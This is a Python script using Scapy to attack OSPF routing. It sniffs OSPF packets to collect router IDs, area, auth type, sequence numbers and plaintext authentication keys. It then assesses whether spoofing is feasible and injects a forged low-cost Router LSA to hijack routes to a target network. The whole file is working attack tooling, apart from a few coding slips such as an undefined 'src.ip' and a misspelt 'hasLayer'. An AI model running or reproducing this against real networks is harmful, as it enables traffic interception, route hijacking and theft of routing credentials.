from scapy.all import *
from scapy.contrib.ospf import *

discovered = {
        "routers": {},
        "area_id": None,
        "auth_type": None,
        "sequences": {},
}

def parse_ospf(pkt):
    if not pkt.haslayer(OSPF_Hdr):
        return

    hdr = pkt[OSPF_Hdr]
    src_ip = pkt[IP].src

    # Extract core info from every OSPF packet
    discovered["area_id"] = hdr.area
    discovered["auth_type"] = hdr.authtype
    discovered["routers"][src_ip] = hdr.src # src = Router ID

    # Authentication Type Mapper
    auth_map = {
            0: "None (trivial)",
            1: "Plaintext",
            2: "MD5",
            }

    print(f"[*] Router {hdr.src} at {src.ip} |"
          f"Auth: {auth_map.get(hdr.authtype, 'Unknown')}")

    # Extract sequence numbers from LSAs
    if pkt.hasLayer(OSPF_LSUpd):
        for lsa in pkt[OSPF_LSUpd].lsalist:
            if hasattr(lsa, 'seq'):
                discovered["sequences"][hdr.src] = lsa.seq
                print(f"[*] LSA seq from {hdr.src}: {lsa.seq:#010x}")

    # Plaintext auth - simple extract key
    if hdr.authtype == 1:
        print(f"[!] Plaintext auth key: {hdr.authdata}")

def discover(iface="eth0", timeout=30):
    print(f"[*] Listening for OSPF on {iface} for {timeout}s...")
    sniff(iface=iface, filter="proto 89", prn=parse_ospf, timeout=timeout)
    return discovered

def evaluate_attack_feasibility(discovered):
    atype = discovered["auth_type"]
    
    if atype == 0:
        print("[+] No auth — spoofing is straightforward")
        return "spoof"
    
    elif atype == 1:
        print("[+] Plaintext auth detected")
        print("[+] Recovered key from sniff — can craft valid packets")
        return "spoof_with_key"
    
    elif atype == 2:
        print("[-] MD5 auth enabled — cannot forge without key")
        print("[*] Recommendation: exploit misconfigured neighbor")
        print("[*] Or document this as: attack blocked by MD5 auth (this is a valid demo)")
        return "blocked"
    
    return "unknown"

def inject_lsa(iface, spoof_router_id, target_network, area_id, 
               seq, auth_type=0, auth_key=None):
    
    # Craft the Router LSA
    lsa = OSPF_Router_LSA(
        age=1,
        seq=seq + 1,          # Must be higher than observed
        id=spoof_router_id,
        adrouter=spoof_router_id,
        linklist=[
            OSPF_Link(
                id=target_network,
                data="255.255.255.0",
                type=3,       # Stub network
                metric=1      # Low cost = preferred path
            )
        ]
    )
    
    lsu = OSPF_LSUpd(lsalist=[lsa])
    
    ospf_hdr = OSPF_Hdr(
        type=4,               # LS Update
        src=spoof_router_id,
        area=area_id,
        authtype=auth_type
    )
    
    pkt = (
        IP(dst="224.0.0.5", src=spoof_router_id) /  # AllSPFRouters multicast
        ospf_hdr /
        lsu
    )
    
    send(pkt, iface=iface, verbose=1)
    print(f"[*] Injected LSA claiming low-cost path via {spoof_router_id}")
